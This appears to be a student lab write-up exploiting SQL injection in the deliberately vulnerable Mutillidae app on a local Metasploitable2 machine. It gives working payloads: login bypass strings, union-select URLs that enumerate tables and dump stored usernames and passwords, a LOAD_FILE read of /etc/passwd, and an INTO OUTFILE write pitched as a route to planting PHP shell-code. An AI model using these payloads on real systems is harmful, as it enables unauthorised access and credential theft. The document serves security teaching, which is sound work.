# Sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 
Identify IP address using ifconfig in Metasploitable2
## OUTPUT:

<img width="720" height="369" alt="image" src="https://github.com/user-attachments/assets/92a87615-082f-481d-9628-bf0afe322c03" />


Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
## OUTPUT:

<img width="1231" height="760" alt="image" src="https://github.com/user-attachments/assets/53853ab1-3362-43de-b7be-f61d8a017d5c" />

Select Multidae from the menu listed as shown above. You will get the page as displayed below:
## OUTPUT:

<img width="1223" height="861" alt="image" src="https://github.com/user-attachments/assets/25fabc6f-8b15-4c92-8398-6adf1f09451a" />

Click on the menu Login/Register and register for an account
## OUTPUT:

<img width="1227" height="903" alt="image" src="https://github.com/user-attachments/assets/ff57010a-8708-4022-8fde-89fd4f953d5b" />

Click on the link “Please register here”

<img width="1226" height="891" alt="image" src="https://github.com/user-attachments/assets/7bdfbd7f-bd94-4df4-bdd4-e6c6cbb7c553" />


Click on “Create Account” to display the following page:
## OUTPUT:

<img width="1222" height="882" alt="image" src="https://github.com/user-attachments/assets/5d7c83ac-1aaa-47aa-926a-7797636cb64c" />


The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page. 

<img width="1225" height="901" alt="image" src="https://github.com/user-attachments/assets/7b1153b7-478a-454a-8514-1b00b0b77b5e" />

Click “Login”. The logged in page will show as below:

## OUTPUT:

<img width="1215" height="905" alt="image" src="https://github.com/user-attachments/assets/fe042ecf-2bc5-4e54-be7d-f161fe11651c" />

## Bypassing login field

The username field is vulnerable. Put (blaise’ #) or (blaise’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “blaise.”
Now after logging out you will see the login page. In the login page give blaise’ # . You can see the page now enters into the administrator page as before when giving the password.
## OUTPUT:

<img width="1227" height="897" alt="image" src="https://github.com/user-attachments/assets/45062ebd-e8aa-44ea-85c8-5ffb5ac62053" />

Click the login button and you will see it enter into the administrator page
## OUTPUT:

<img width="1233" height="894" alt="image" src="https://github.com/user-attachments/assets/46687955-4394-4861-8bb4-48d5834eadc0" />

## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below:
## OUTPUT:

<img width="1224" height="910" alt="image" src="https://github.com/user-attachments/assets/acb9a559-7abc-419a-8417-154afc784355" />
<img width="1232" height="916" alt="image" src="https://github.com/user-attachments/assets/ea9ee40c-c2a1-4e70-9ec9-dabba65bc505" />
<img width="1227" height="912" alt="image" src="https://github.com/user-attachments/assets/50c406bf-920f-474e-a238-f9d3e87eaa63" />
<img width="1233" height="911" alt="image" src="https://github.com/user-attachments/assets/11700177-eb80-4ed1-be71-2c9a7602270b" />


From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

## OUTPUT:

<img width="1230" height="909" alt="image" src="https://github.com/user-attachments/assets/906663fe-1871-4585-bc4d-fb05d72a974c" />

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:
http://192.168.56.102/mutillidae/index.php?page=user-info.php&username=navin%27order%20by%206%23&password=kumar&user-info-php-submit-button=View+Account+Details
## OUTPUT:
<img width="1228" height="909" alt="image" src="https://github.com/user-attachments/assets/251eba6e-c04c-46cc-8e54-68402c97b3e1" />

After adding the order by 6 into the existing url , the following error statement will be obtained:
## OUTPUT:

<img width="1268" height="909" alt="Screenshot 2026-05-25 212857" src="https://github.com/user-attachments/assets/90c8d20f-1a85-4248-86d3-e93b2b552197" />

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
## OUTPUT:

<img width="1268" height="909" alt="Screenshot 2026-05-25 212857" src="https://github.com/user-attachments/assets/90c8d20f-1a85-4248-86d3-e93b2b552197" />

 As it is having 5 columns the query worked fine and it provides the correct result
## OUTPUT:

<img width="1231" height="969" alt="image" src="https://github.com/user-attachments/assets/b2690223-cb0d-466e-96bb-dba9abd11717" />

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5).
## OUTPUT:
<img width="1231" height="969" alt="image" src="https://github.com/user-attachments/assets/b2690223-cb0d-466e-96bb-dba9abd11717" />

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
## OUTPUT:
<img width="1471" height="1006" alt="image" src="https://github.com/user-attachments/assets/1fde02b0-b2ea-43b2-a656-5393df0d6710" />

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.
http://192.168.56.102/mutillidae/index.php?page=user-info.php&username=navin%27union%20select%201,database(),user(),version(),5%23&password=kumar&user-info-php-submit-button=View+Account+Details## OUTPUT:

## OUTPUT:

<img width="1466" height="997" alt="Screenshot 2026-05-25 223435" src="https://github.com/user-attachments/assets/57a1be0f-0d79-43fe-af9c-486f4256d3e1" />

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’
http://192.168.56.102/mutillidae/index.php?page=user-info.php&username=navin%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=kumar&user-info-php-submit-button=View+Account+Details

## OUTPUT:

<img width="1919" height="1002" alt="Screenshot 2026-05-25 224004" src="https://github.com/user-attachments/assets/dd7d9376-b865-46ee-870c-2b14c29680f2" />

The url once executed will  retrieve table names from the “owasp 10” database.

## Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

<img width="1467" height="1004" alt="Screenshot 2026-05-25 224506" src="https://github.com/user-attachments/assets/a50b0133-ae7d-402a-a7ec-59c4d5c5052e" />


The column names of the accounts is displayed below for the following url:
http://192.168.56.102/mutillidae/index.php?page=user-info.php&username=navin%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=kumar&user-info-php-submit-button=View+Account+Details 

## OUTPUT:
<img width="1472" height="1011" alt="Screenshot 2026-05-25 224833" src="https://github.com/user-attachments/assets/6be89f6c-99dc-40c8-b975-49a3e270c571" />


Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).
http://192.168.56.102/mutillidae/index.php?page=user-info.php&username=navin%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=kumar&user-info-php-submit-button=View+Account+Details
## OUTPUT:
<img width="1474" height="986" alt="image" src="https://github.com/user-attachments/assets/80e24d98-8fe1-41f4-a461-26186440b319" />
<img width="1472" height="800" alt="image" src="https://github.com/user-attachments/assets/c0b2c441-d044-44b5-9671-6544b7c0bd76" />
<img width="1466" height="446" alt="image" src="https://github.com/user-attachments/assets/0ac177d8-ad88-4386-a52f-ea3a64ae0502" />


## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
http://192.168.56.102/mutillidae/index.php?page=user-info.php&username=navin%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=kumar&user-info-php-submit-button=View+Account+Details
## OUTPUT:
<img width="1471" height="996" alt="image" src="https://github.com/user-attachments/assets/c2fa8f32-f8ef-4a8d-a37c-79b5c41b68af" />

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).


## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
